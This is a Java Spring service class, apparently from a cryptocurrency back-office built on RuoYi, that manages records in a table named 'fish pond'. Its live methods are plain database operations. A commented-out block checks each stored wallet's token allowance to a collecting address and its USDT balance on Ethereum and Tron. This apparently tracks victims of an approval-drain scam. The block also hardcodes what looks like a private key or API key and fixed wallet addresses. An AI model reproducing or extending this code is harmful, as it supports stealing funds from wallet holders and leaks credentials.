package com.ruoyi.wak.service.impl;

import java.math.BigDecimal;
import java.util.List;

import com.ruoyi.common.utils.TridentJavaUtils;
import com.ruoyi.common.utils.We3jUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import com.ruoyi.wak.mapper.WakYuchiMapper;
import com.ruoyi.wak.domain.WakYuchi;
import com.ruoyi.wak.service.IWakYuchiService;
import org.web3j.abi.datatypes.generated.Uint256;

/**
 * 鱼池Service业务层处理
 *
 * @author ruoyi
 * @date 2025-01-24
 */
@Service
public class WakYuchiServiceImpl implements IWakYuchiService
{
    @Autowired
    private WakYuchiMapper wakYuchiMapper;

    /**
     * 查询鱼池
     *
     * @param userId 鱼池主键
     * @return 鱼池
     */
    @Override
    public WakYuchi selectWakYuchiByUserId(Long userId)
    {
        return wakYuchiMapper.selectWakYuchiByUserId(userId);
    }

    /**
     * 查询鱼池列表
     *
     * @param wakYuchi 鱼池
     * @return 鱼池
     */
    @Override
    public List<WakYuchi> selectWakYuchiList(WakYuchi wakYuchi) {
        List<WakYuchi> list = wakYuchiMapper.selectWakYuchiList(wakYuchi);
//        for (WakYuchi wakYuchi1 : list) {
//            String address = wakYuchi1.getAddress();
//            try {
//                // 检查以太坊地址
//                if (address.startsWith("0x") && address.length() == 42) {
//                    We3jUtils we3jTest2 = new We3jUtils();
//                    BigDecimal res = we3jTest2.getAllowance(wakYuchi1.getAddress(), wakYuchi1.getToAddress());
//                    res = res.divide(new BigDecimal(1000000));
//                    wakYuchi1.setAllowance(res);
//                    Uint256 balanceRes = we3jTest2.balanceOf2(We3jUtils.usdtcontractAddress,"0xAcE52aa8b67eD260306572F997fBA22bd5b1d4F5");
//                    wakYuchi1.setUsdtBalance(new BigDecimal(balanceRes.getValue()).divide(new BigDecimal(1000000)));
//                }
//                // 检查 Tron 地址
//                if (address.startsWith("T") || address.startsWith("41")) {
//                    BigDecimal allowance = TridentJavaUtils.getAllowance("185287c127c20b5695b2e818a33fafd7b1b896db89389d4dc40f7e0981dc50f0",
//                            wakYuchi.getAddress(), wakYuchi.getToAddress());
//                    allowance = allowance.divide(new BigDecimal(1000000));
//                    wakYuchi1.setAllowance(allowance);
//                    BigDecimal balance = TridentJavaUtils.getBalance("185287c127c20b5695b2e818a33fafd7b1b896db89389d4dc40f7e0981dc50f0","TZ5mw8Pu2tqeiHZZtZcLu7Go5z83JhuZpX");
//                    balance = balance.divide(new BigDecimal(1000000));
//                    wakYuchi1.setUsdtBalance(balance);
//                }
//            }catch (Exception e){
//                System.out.println(e.getMessage());
//                wakYuchi1.setAllowance(BigDecimal.ZERO);
//                wakYuchi1.setUsdtBalance(BigDecimal.ZERO);
//            }
//            wakYuchiMapper.updateWakYuchi(wakYuchi1);
//        }
        return list;
    }

    /**
     * 新增鱼池
     *
     * @param wakYuchi 鱼池
     * @return 结果
     */
    @Override
    public int insertWakYuchi(WakYuchi wakYuchi)
    {
        return wakYuchiMapper.insertWakYuchi(wakYuchi);
    }

    /**
     * 修改鱼池
     *
     * @param wakYuchi 鱼池
     * @return 结果
     */
    @Override
    public int updateWakYuchi(WakYuchi wakYuchi)
    {
        return wakYuchiMapper.updateWakYuchi(wakYuchi);
    }

    /**
     * 批量删除鱼池
     *
     * @param userIds 需要删除的鱼池主键
     * @return 结果
     */
    @Override
    public int deleteWakYuchiByUserIds(Long[] userIds)
    {
        return wakYuchiMapper.deleteWakYuchiByUserIds(userIds);
    }

    /**
     * 删除鱼池信息
     *
     * @param userId 鱼池主键
     * @return 结果
     */
    @Override
    public int deleteWakYuchiByUserId(Long userId)
    {
        return wakYuchiMapper.deleteWakYuchiByUserId(userId);
    }
}
